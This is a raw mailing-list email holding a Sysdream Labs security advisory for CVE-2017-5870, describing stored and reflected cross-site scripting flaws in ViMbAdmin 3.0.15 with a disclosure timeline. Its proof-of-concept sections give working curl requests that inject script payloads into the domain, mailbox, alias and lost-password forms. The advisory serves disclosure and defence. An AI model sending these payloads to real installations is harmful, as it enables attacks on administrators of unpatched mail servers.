X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5588" "Wednesday" "3" "May" "2017" "16:03:48" "+0200" "Sysdream Labs" "labs@sysdream.com" "<f9bad8be-8624-09e5-a6ea-a3d56a715d39@sysdream.com>" "182" "[oss-security] [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin" nil nil nil "5" "2017050314:03:48" "[oss-security] [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin" (number mark "U       labs@sysdrea May  3  182/5588  " thread-indent "\"[oss-security] [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15390 invoked by uid 550); 3 May 2017 14:04:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14212 invoked from network); 3 May 2017 14:04:10 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com B94871A11D9
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1493820229;
	bh=UmKbYaAE/YWkE3W2VhluREElJfhE6FwmZ88+w5bTjck=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=E69giUjkelYRlKKNbYd4/I0O/p5uL5HpledGGm+/f+8ub7bgobYkfnr2qARbmL+mY
	 x30d5ofJ+Zu7QA3SSBAsq/nQnogBpXLClLB06Q5zHto6b9SQUV0EliTyo27PXMQB6n
	 HnintSvPuAtxIJueUedcPkwDagMzxGXvmixcoo+M=
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <f9bad8be-8624-09e5-a6ea-a3d56a715d39@sysdream.com>
Date: Wed, 3 May 2017 16:03:48 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="Fb95gAt6v2CkAmegXIrFjGlXWuLhjW0tl"
Subject: [oss-security] [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin

--Fb95gAt6v2CkAmegXIrFjGlXWuLhjW0tl
Content-Type: multipart/mixed; boundary="OrQck0oLrIfgsqpSGGIDETRoCb2VTAPju";
 protected-headers="v1"
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <f9bad8be-8624-09e5-a6ea-a3d56a715d39@sysdream.com>
Subject: [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin

--OrQck0oLrIfgsqpSGGIDETRoCb2VTAPju
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-5870] Multiple XSS vulnerabilities in ViMbAdmin

## Product Description

ViMbAdmin is a web-based interface used to manage a mail server with virtua=
l domains, mailboxes and aliases. It is an open source solution developed b=
y Opensolutions and distributed under the GNU/GPL license version 3. The of=
ficial web site can be found at www.vimbadmin.net.

## Details

**CVE ID**: CVE-2017-5870
=20=20=20=20
**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-79

**CVSS Base Score**: 7.2

**CVSS vector**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H


## Proof of Concept

### Domain creation form

#### Exploit

The domain creation form is vulnerable to a stored XSS vulnerability, throu=
gh the `domain` and `transport` variables:

```
curl 'http://<ip>/domain/add' -H 'Cookie: VIMBADMIN3=3D<SESSIONID>;' --data=
 'domain=3Dtestdomain%22%3E%3Cscript%3Ealert%28%27xss domain%27%29%3C%2Fscr=
ipt%3E&description=3Dnone&backupmx=3D0&active=3D0&active=3D1&max_aliases=3D=
0&max_mailboxes=3D0&transport=3Dvirtual%22%3E%3Cscript%3Ealert%28%27XSS vir=
tual%27%29%3C%2Fscript%3E' --compressed ;
```

The payload gets injected inside the `http://<ip>/domain/list` page.

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/DomainController.php` file.

### Mailbox creation form

#### Exploit

The mailbox creation form is vulnerable to a stored XSS vulnerability, in t=
he `name` variable:

```
curl 'http://mailadmin.commeun.ninja/mailbox/add/did/<domain id>' -H 'Cooki=
e: VIMBADMIN3=3D<SESSIONID>' --data 'local_part=3Dtest&domain=3D<domain id>=
&name=3Dtest%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&password=
=3D<password>&quota=3D0&alt_email=3D&cc_welcome_email=3D'
```

The payload gets injected inside the `http://<ip>/mailbox/list` page.

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/MailboxController.php` file.

### Alias creation form

#### Exploit

The alias creation form is vulnerable to a stored XSS vulnerability, in the=
 `goto` variable:

```
curl 'http://<ip>/alias/add/did/<domain id>' -H 'Cookie: VIMBADMIN3=3D<SESS=
IONID>' --data 'local_part=3Dtest&domain=3D4&goto%5B%5D=3Dtest%40test.com%2=
2%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'
```

The payload gets injected inside the `http://<ip>/alias` page.

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/AliasController.php` file.

### On reset password page

#### Exploit

A reflected XSS vulnerability has been found on the alias creation form, us=
ing variables `captchatext`.

```
curl 'http://<ip>/auth/lost-password' --data 'username=3Dnone&captchaid=3D<=
captcha id>&requestnewimage=3D0&captchatext=3Dnone%22%3E%3Cscript%3Ealert%2=
8%27XSS%27%29%3C%2Fscript%3E&login=3DReset+Password'

```

The payload gets injected inside the `http://<ip>/alias` page.

#### Vulnerable code

The vulnerable code is located in the `_getFormLostPassword()` method of th=
e `<vimbadmin directory>/application/controllers/AuthController.php` file.

## Affected version

* tested on version 3.0.15

## Timeline (dd/mm/yyyy)

* 22/01/2017 : Initial discovery.
* 16/02/2017 : First contact with opensolutions.io
* 16/02/2017 : Advisory sent.
* 24/02/2017 : Reply from the owner, acknowledging the report and planning =
to fix the vulnerabilities.
* 13/03/2017 : Sysdream Labs request for an update.
* 29/03/2017 : Second request for an update.
* 29/03/2017 : Reply from the owner stating that he has no time to fix the =
issues.
* 03/05/2017 : Full disclosure.

## Credits

* Florian NIVETTE, Sysdream (f.nivette -at- sysdream -dot- com)

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--OrQck0oLrIfgsqpSGGIDETRoCb2VTAPju--

--Fb95gAt6v2CkAmegXIrFjGlXWuLhjW0tl
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJZCeNEAAoJEI60jNnVslmhOHgP/3fqCPLodcdBfjQrIMConTMl
sQzRpbaS8yuKW3UvEbrdWQak3YftEHeU065L/KLOiZkgqGNHOvcw7VTMwvvcS5vj
IsQOYtGZ3RJ+G4lWnbrtF9x+kowKMhGAu5LTA2iW+tz84LNaf8YKOquCAcXTLets
aoYMwpcr1+zsXTs3H7LmGGCqEsP1elTlfPZl82/+6q31NDc6dYAM3vRvCYLN63w2
SOruRgl7Kxjxprmlr+j7jusscd6CYGTqVmVZDLhFvhL13ongFXTnpk4G1tub07Y5
Nspx/f7cFCmzXxXX8gEHlxv4VVQexjiyzCLzB8A3nM9LSs461u0+41i3Gbh8qbel
1vJtgF1cwbVGZeugFHgwNHlTY1duxYA9icA9DLQ26L6C/feCrqtGsvMVEnYoK8Sd
k6mBAdU20VpdlL7GUt5c41RmSbNfVcw2nazaC5vySTIsW/5YUeG6Z9J/4Sxs6UBi
vUYsOSAj7fuIHY2mnMWQyrJqxt4AgzOuONzE7Ln474+LxLLVm8t2BbI3JW+yanJo
tCB+r9YQi2EDvId6xVxTXaezdDjHaUvKEIDVLBHVUD0CBZ+Z8DLwOp0TNMJ/pg/r
RZsqr6i3slhDd7VdnhVgTH3jQY6KTL0YNXVf8TFSTCZomLNcISr9P/iHRjIdoc3Q
7iJWVj3vs35tnWHtaQSx
=lc3i
-----END PGP SIGNATURE-----

--Fb95gAt6v2CkAmegXIrFjGlXWuLhjW0tl--
